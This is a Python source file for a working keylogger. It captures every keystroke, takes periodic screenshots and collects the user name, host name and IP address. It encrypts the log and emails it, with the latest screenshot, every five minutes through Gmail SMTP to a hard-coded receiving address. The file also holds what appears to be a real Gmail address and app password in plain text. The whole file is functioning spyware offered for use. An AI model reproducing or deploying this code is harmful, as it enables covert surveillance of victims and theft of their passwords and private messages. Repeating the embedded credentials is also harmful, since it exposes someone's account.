import pynput
from pynput.keyboard import Key, Listener
import logging
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import threading
import time
from cryptography.fernet import Fernet
import pyautogui
import shutil
import sys
import tempfile
import getpass
import platform
import socket
import subprocess
from datetime import datetime

# ================= CONFIG =================
LOG_FILE = "keylog.txt"
ENCRYPTED_LOG_FILE = "encrypted_log.txt"

EMAIL_ADDRESS = "sheetanshkukrety@gmail.com"
EMAIL_PASSWORD = "ssxb pzwn bfty leju"
RECEIVER_EMAIL = "shanuwrites02@gmail.com"

EMAIL_INTERVAL = 300        # ✅ 5 minutes AFTER launch
SCREENSHOT_INTERVAL = 60
SCREENSHOT_DIR = "screenshots"
# ==========================================

def generate_key():
    key = Fernet.generate_key()
    with open("secret.key", "wb") as f:
        f.write(key)
    return key

def load_key():
    if not os.path.exists("secret.key"):
        return generate_key()
    return open("secret.key", "rb").read()

def encrypt_data(data, key):
    return Fernet(key).encrypt(data.encode())

def setup_logging():
    logging.basicConfig(
        filename=LOG_FILE,
        level=logging.DEBUG,
        format="%(asctime)s: %(message)s"
    )

def take_screenshot():
    try:
        os.makedirs(SCREENSHOT_DIR, exist_ok=True)
        name = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        path = os.path.join(SCREENSHOT_DIR, name)
        pyautogui.screenshot(path)
        return path
    except:
        return None

def send_email():
    try:
        # ✅ FIX 1: force log flush so keystrokes are written
        for handler in logging.root.handlers:
            handler.flush()

        key = load_key()

        with open(LOG_FILE, "r", errors="ignore") as f:
            log_data = f.read()

        encrypted_log = encrypt_data(log_data, key)
        with open(ENCRYPTED_LOG_FILE, "wb") as f:
            f.write(encrypted_log)

        msg = MIMEMultipart()
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = RECEIVER_EMAIL
        msg["Subject"] = f"Keylogger Report - {datetime.now()}"

        system_info = f"""
OS: {platform.system()} {platform.release()}
User: {getpass.getuser()}
Host: {socket.gethostname()}
IP: {socket.gethostbyname(socket.gethostname())}
"""
        msg.attach(MIMEText(system_info, "plain"))

        with open(ENCRYPTED_LOG_FILE, "rb") as f:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(f.read())

        encoders.encode_base64(part)
        part.add_header("Content-Disposition", "attachment; filename=log.enc")
        msg.attach(part)

        if os.path.exists(SCREENSHOT_DIR):
            shots = [f for f in os.listdir(SCREENSHOT_DIR) if f.endswith(".png")]
            if shots:
                latest = max(shots, key=lambda x: os.path.getmtime(os.path.join(SCREENSHOT_DIR, x)))
                with open(os.path.join(SCREENSHOT_DIR, latest), "rb") as f:
                    img = MIMEBase("image", "png")
                    img.set_payload(f.read())
                encoders.encode_base64(img)
                img.add_header("Content-Disposition", f"attachment; filename={latest}")
                msg.attach(img)

        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)

        print("Email sent")

    except Exception as e:
        print("Email error:", e)

def periodic_screenshot():
    while True:
        take_screenshot()
        time.sleep(SCREENSHOT_INTERVAL)

def periodic_email():
    # ✅ FIX 2: wait FIRST, then send
    time.sleep(EMAIL_INTERVAL)
    while True:
        send_email()
        time.sleep(EMAIL_INTERVAL)

def on_press(key):
    try:
        logging.info(key.char)
    except:
        if key == Key.space:
            logging.info(" ")
        elif key == Key.enter:
            logging.info("\n")
        else:
            logging.info(f"[{key}]")

def on_release(key):
    if key == Key.esc:
        return False

def main():
    setup_logging()

    logging.info("\n--- SESSION STARTED ---\n")

    threading.Thread(target=periodic_screenshot, daemon=True).start()
    threading.Thread(target=periodic_email, daemon=True).start()

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()